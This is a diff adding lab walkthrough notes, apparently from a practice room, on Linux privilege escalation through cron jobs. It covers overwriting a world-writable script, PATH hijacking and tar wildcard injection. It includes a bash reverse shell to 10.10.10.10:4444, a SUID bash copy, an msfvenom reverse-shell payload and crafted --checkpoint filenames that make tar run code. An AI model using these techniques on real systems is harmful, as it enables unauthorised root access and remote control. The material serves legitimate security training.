@@ -1,0 +1,107 @@
+===================================================================================================================
+                                            FILE PERMISSIONS
+===================================================================================================================
+
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
+
+View the contents of the system-wide crontab:
+
+$ cat /etc/crontab
+
+There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
+
+Locate the full path of the overwrite.sh file:
+
+$ locate overwrite.sh
+
+Note that the file is world-writable:
+
+$ ls -l /usr/local/bin/overwrite.sh
+
+Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
+
+---------------------------------------------------------
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+---------------------------------------------------------
+
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+
+$ nc -nvlp 4444
+
+Remember to exit out of the root shell and remove the reverse shell code before continuing!
+
+===================================================================================================================
+                                        PATH ENVIRONMENT VARIABLES
+===================================================================================================================
+
+
+
+View the contents of the system-wide crontab:
+
+$ cat /etc/crontab
+
+Note that the PATH variable starts with /home/user which is our user's home directory.
+
+Create a file called overwrite.sh in your home directory with the following contents:
+
+-------------------------------------
+#!/bin/bash                         |
+                                    |
+cp /bin/bash /tmp/rootbash          |
+chmod +xs /tmp/rootbash             |
+-------------------------------------
+
+Make sure that the file is executable:
+
+$ chmod +x /home/user/overwrite.sh
+
+Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
+
+$ /tmp/rootbash -p
+
+Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
+
+$ rm /tmp/rootbash
+$ exit
+
+
+===================================================================================================================
+                                               WILD CARDS
+===================================================================================================================
+
+
+View the contents of the other cron job script:
+
+cat /usr/local/bin/compress.sh
+
+Note that the tar command is being run with a wildcard (*) in your home directory.
+
+Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
+
+Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+
+Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
+
+chmod +x /home/user/shell.elf
+
+Create these two files in /home/user:
+
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+
+When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
+
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+
+nc -nvlp 4444
+
+Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
+
+rm /home/user/shell.elf
+rm /home/user/--checkpoint=1
+rm /home/user/--checkpoint-action=exec=shell.elf
+
+
